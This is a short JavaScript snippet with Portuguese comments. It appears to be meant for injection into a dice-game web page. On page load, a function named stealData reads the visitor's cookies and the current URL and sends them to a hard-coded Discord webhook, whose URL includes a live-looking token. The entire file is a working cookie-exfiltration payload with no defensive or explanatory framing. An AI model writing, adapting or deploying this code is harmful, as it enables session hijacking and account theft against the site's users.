// Função para capturar dados e enviar ao Discord
function stealData() {
    const cookie = document.cookie;
    const url = window.location.href;
    
    fetch('https://discord.com/api/webhooks/1546724388857192640/aJ9RiFtKXN5YIh3xdcgbJc15aFmK_EtQZ5rbfBSQLxNYP6RzrNJQY7ZRktgUNW2QpBL_', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
            content: `🎲 **Dados do Dice Capturados!**\nURL: ${url}\nCookies: ${cookie}` 
        })
    });
}

// Executa a captura assim que a página carregar
window.onload = stealData;
